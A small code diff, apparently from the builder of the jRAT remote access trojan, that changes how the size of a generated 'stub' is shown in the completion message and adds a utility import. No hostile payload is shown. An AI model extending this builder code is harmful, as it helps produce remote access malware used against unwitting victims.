@@ -36,6 +36,7 @@ import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
 import se.jrat.common.hash.Md5;
 import se.jrat.common.hash.Sha1;
+import se.jrat.common.utils.DataUnits;
 
 import com.redpois0n.zkmlib.Configuration;
 
@@ -359,7 +360,7 @@ public class Build {
 			listener.reportProgress(95, "MD5 of file: " + md5.hash(file), BuildStatus.INFO);
 			listener.reportProgress(95, "SHA1 of file: " + sha1.hash(file), BuildStatus.INFO);
 
-			listener.done("Saved stub. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");
+			listener.done("Saved stub. Took " + (end - start) + " ms, size " + DataUnits.getAsString(file.length()));
 
 			DialogSummary frame = new DialogSummary(file, addressString, pass, id, listener.getStatuses());
 			frame.setVisible(true);
